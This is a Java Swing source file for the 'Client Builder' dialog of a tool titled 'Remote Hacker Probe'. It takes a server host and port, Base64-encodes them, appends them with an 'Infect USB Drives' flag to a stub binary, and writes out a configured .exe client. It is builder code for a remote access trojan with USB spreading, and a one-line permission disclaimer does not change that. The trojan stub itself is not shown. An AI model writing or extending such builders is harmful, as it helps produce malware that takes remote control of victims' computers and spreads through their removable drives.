package rhp;

import java.awt.BorderLayout;
import java.awt.FlowLayout;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.filechooser.FileNameExtensionFilter;

import org.apache.commons.codec.binary.Base64;

import javax.swing.JLabel;
import javax.swing.JOptionPane;

import java.awt.Font;
import javax.swing.JTextField;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.awt.event.ActionEvent;
import javax.swing.JCheckBox;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;

public class Builder extends JDialog {

	private final JPanel contentPanel = new JPanel();
	private JTextField portvalue;
	static JCheckBox usb;
	
	/**
	 * Launch the application.
	 */
	
	private static void copyFile(File source, File dest) throws IOException {
	    InputStream is = null;
	    OutputStream os = null;
	    try {
	        is = new FileInputStream(source);
	        os = new FileOutputStream(dest);
	        byte[] buffer = new byte[1024];
	        int length;
	        while ((length = is.read(buffer)) > 0) {
	            os.write(buffer, 0, length);
	        }
	    } finally {
	        is.close();
	        os.close();
	    }
	}
	
	public static void build(String FilePath, String Host, String Port)
	{
		
		File stub = new File("probe_bin");
		String usbthread = "";
		
		if(usb.isSelected())
		{
			usbthread = "1";
		} else {
			usbthread = "0";
		}
		
		String fullvalue = Host + ":" + Port + ":" + usbthread;
		
		File destination = new File(FilePath);
		if(stub.exists()) {
			try {
				copyFile(stub, destination);
				FileWriter wt = new FileWriter(destination, true);
				wt.write("\n\n"); wt.write(fullvalue);
				wt.close();
				JOptionPane.showMessageDialog(null, "Built Client : " + destination);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else {
			JOptionPane.showMessageDialog(null, "ERROR : Cannot create stub because file 'probe_bin' is missing! Which is required!");
		}
	}
	
	/**
	 * Create the dialog.
	 */
	public Builder() {
		setResizable(false);
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe | Client Builder");
		setBounds(100, 100, 379, 180);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		
		JLabel host = new JLabel("Server Host : ");
		host.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		JLabel lblNewLabel = new JLabel("Server Port : ");
		lblNewLabel.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		JTextField hostvalue = new JTextField();
		hostvalue.setFont(new Font("Consolas", Font.PLAIN, 12));
		hostvalue.setColumns(10);
		
		portvalue = new JTextField();
		portvalue.setFont(new Font("Consolas", Font.PLAIN, 12));
		portvalue.setColumns(10);
		
		JButton btnNewButton = new JButton("Build");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String hs = hostvalue.getText();
				String ps = portvalue.getText();
				if(hs.length() > 0 && ps.length() > 0)
				{
					byte[] encodedHost = Base64.encodeBase64(hs.getBytes());
					String b64host = new String(encodedHost);
					
					byte[] encodedPort = Base64.encodeBase64(ps.getBytes());
					String b64port = new String(encodedPort);
					
					
					
					File fileToSave = null;
					JFileChooser fileChooser = new JFileChooser();
					FileNameExtensionFilter filter = new FileNameExtensionFilter("EXE File","exe");
					fileChooser.setFileFilter(filter);
					fileChooser.setDialogTitle("Where should this file be saved?");   
					int userSelection = fileChooser.showSaveDialog(null);
					 
					if (userSelection == JFileChooser.APPROVE_OPTION) {
					    fileToSave = fileChooser.getSelectedFile();
					    build(fileToSave.getAbsolutePath() + ".exe", b64host, b64port);
					    
					}
					
				} else {
					JOptionPane.showMessageDialog(null, "One or more values have been left empty.");
				}
			}
		});
		btnNewButton.setFont(new Font("Calibri", Font.BOLD, 12));
		
		JLabel lblNewLabel_1 = new JLabel("Only install where you have permission to do so!");
		lblNewLabel_1.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		usb = new JCheckBox("Infect USB Drives");
		
		usb.setFont(new Font("Calibri", Font.PLAIN, 12));
		GroupLayout gl_contentPanel = new GroupLayout(contentPanel);
		gl_contentPanel.setHorizontalGroup(
			gl_contentPanel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addGap(5)
					.addGroup(gl_contentPanel.createParallelGroup(Alignment.LEADING)
						.addComponent(lblNewLabel_1, GroupLayout.PREFERRED_SIZE, 277, GroupLayout.PREFERRED_SIZE)
						.addGroup(gl_contentPanel.createParallelGroup(Alignment.LEADING)
							.addGroup(gl_contentPanel.createSequentialGroup()
								.addComponent(lblNewLabel, GroupLayout.DEFAULT_SIZE, 85, Short.MAX_VALUE)
								.addComponent(portvalue, GroupLayout.PREFERRED_SIZE, 261, GroupLayout.PREFERRED_SIZE)
								.addGap(2))
							.addGroup(gl_contentPanel.createSequentialGroup()
								.addComponent(host, GroupLayout.DEFAULT_SIZE, 85, Short.MAX_VALUE)
								.addComponent(hostvalue, GroupLayout.PREFERRED_SIZE, 261, GroupLayout.PREFERRED_SIZE)
								.addGap(2))
							.addGroup(gl_contentPanel.createSequentialGroup()
								.addPreferredGap(ComponentPlacement.RELATED)
								.addComponent(usb, GroupLayout.DEFAULT_SIZE, 123, Short.MAX_VALUE)
								.addGap(129)
								.addComponent(btnNewButton, GroupLayout.DEFAULT_SIZE, 86, Short.MAX_VALUE)
								.addPreferredGap(ComponentPlacement.RELATED))))
					.addGap(0))
		);
		gl_contentPanel.setVerticalGroup(
			gl_contentPanel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addGap(6)
					.addComponent(lblNewLabel_1, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE)
					.addGroup(gl_contentPanel.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addGap(19)
							.addComponent(host, GroupLayout.PREFERRED_SIZE, 14, Short.MAX_VALUE)
							.addGap(7))
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addGap(9)
							.addComponent(hostvalue, GroupLayout.DEFAULT_SIZE, 31, Short.MAX_VALUE)))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPanel.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addGap(14)
							.addComponent(lblNewLabel, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE))
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addGap(4)
							.addComponent(portvalue, GroupLayout.DEFAULT_SIZE, 31, Short.MAX_VALUE)))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPanel.createParallelGroup(Alignment.BASELINE)
						.addComponent(usb)
						.addComponent(btnNewButton, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
					.addGap(7))
		);
		contentPanel.setLayout(gl_contentPanel);
	}
}
